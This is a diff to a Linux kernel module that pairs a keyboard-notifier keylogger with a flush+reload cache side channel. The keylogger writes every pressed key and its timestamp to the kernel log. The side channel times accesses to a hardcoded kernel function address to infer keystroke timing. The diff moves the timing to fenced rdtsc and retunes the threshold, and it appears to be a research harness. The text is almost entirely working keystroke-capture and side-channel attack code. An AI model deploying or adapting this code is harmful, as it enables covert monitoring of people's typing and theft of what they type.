@@ -9,29 +9,42 @@
 
 static struct notifier_block nb;
 static u64 start_time = 0;
-
-// cache hit threshold in nanoseconds, assuming cpu running at 2.5 to 3 GHz
-#define HIT_THRESHOLD 50
+static int threshold = 155;
 
 // execution time of the flush+reload thread in seconds
 #define EXEC_TIME 10
 
 #define LINE_SIZE 64
 
-#define FUNCTION_ADDRESS 0xffffffffa868eac0
+#define FUNCTION_ADDRESS 0xffffffff9d48eac0
 
-void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
+u64 fenced_rdtsc(void) {
+  u64 a, d;
+  asm volatile("mfence");
+  asm volatile("rdtscp" : "=a"(a), "=d"(d)::"rcx");
+  a = (d << 32) | a;
+  asm volatile("mfence");
+  return a;
+}
+
+void mfence(void) { asm volatile("mfence"); }
 
 void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }
 
-u64 flush_reload(void *addr) {
-  // Measure the start time
-  u64 start_time = ktime_get_real_ns();
-  maccess(addr);
-  u64 elapsed_time = ktime_get_real_ns() - start_time;
-  asm volatile("mfence \n\t");
-  flush(addr);
-  return elapsed_time;
+void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
+
+int flush_reload_t(void *ptr) {
+  uint64_t start = 0, end = 0;
+
+  start = fenced_rdtsc();
+  maccess(ptr);
+  end = fenced_rdtsc();
+
+  mfence();
+
+  flush(ptr);
+
+  return (int)(end - start);
 }
 
 /* Callback function to intercept keypresses */
@@ -41,8 +54,9 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
       (struct keyboard_notifier_param *)data;
 
   if (action == KBD_KEYSYM && param->down) { // Check if a key is pressed
+    u64 t1 = fenced_rdtsc();
     printk(KERN_INFO "{\'key-char\': \'%c\', \'keystroke-time\': %llu}",
-           param->value - 64353 + 'a', ktime_get_real_ns() - start_time);
+           param->value - 64353 + 'a', t1 - start_time);
   }
 
   return NOTIFY_OK;
@@ -51,11 +65,11 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
 static int keystroke_timing(void *data) {
   u64 thread_start = ktime_get_seconds();
   u64 current_time = thread_start;
-  u64 last_hit_time = ktime_get_real_ns();
+  u64 last_hit_time = fenced_rdtsc();
   while (current_time - thread_start < EXEC_TIME) {
-    u64 time = flush_reload((void *)(FUNCTION_ADDRESS));
-    if (time < HIT_THRESHOLD) {
-      u64 current_time_ns = ktime_get_real_ns();
+    u64 time = flush_reload_t((void *)(FUNCTION_ADDRESS));
+    if (time < threshold) {
+      u64 current_time_ns = fenced_rdtsc();
       printk(KERN_INFO "{\'last-hit\': %llu, \'keystroke-time\': %llu}",
              current_time_ns - last_hit_time - time,
              current_time_ns - start_time -
@@ -65,10 +79,9 @@ static int keystroke_timing(void *data) {
     }
     current_time = ktime_get_seconds();
 
-    // each iter takes around 140 ns / 400 cycles
-    for (int i = 0; i < 1000; i++) {
+    u64 t0 = fenced_rdtsc();
+    while (fenced_rdtsc() - t0 < 20000)
       schedule();
-    }
   }
   return 0;
 }
@@ -76,7 +89,7 @@ static int keystroke_timing(void *data) {
 static int __init my_module_init(void) {
   nb.notifier_call = keylogger_notify;
   register_keyboard_notifier(&nb);
-  start_time = ktime_get_real_ns();
+  start_time = fenced_rdtsc();
   printk(KERN_INFO "flush+reload period starts: %llu", start_time);
   keystroke_timing(NULL);
   printk(KERN_INFO "flush+reload period ends");
